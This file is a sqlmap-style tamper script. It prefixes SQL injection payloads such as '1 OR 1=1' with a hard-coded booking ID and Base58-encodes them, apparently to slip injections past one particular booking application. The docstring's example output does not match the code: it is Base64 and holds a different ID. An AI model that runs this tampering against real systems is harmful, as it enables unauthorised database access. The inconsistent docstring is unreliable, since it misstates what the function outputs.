import base58
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Adds prefix 'booking_id:4232283' to the payload and encodes the whole string in Base58.

    Example:
        * Input: '1 OR 1=1'
        * Output: 'Ym9va2luZ19pZDoyNDMyMjgzWzEgT1IgMT0xXQ=='
    """
    if payload:
        prefix = "booking_id:4232283"
        combined_payload = f"{prefix}[{payload}]"
        base58_encoded_payload = base58.b58encode(combined_payload.encode('utf-8')).decode('utf-8')
        return base58_encoded_payload
    return payload
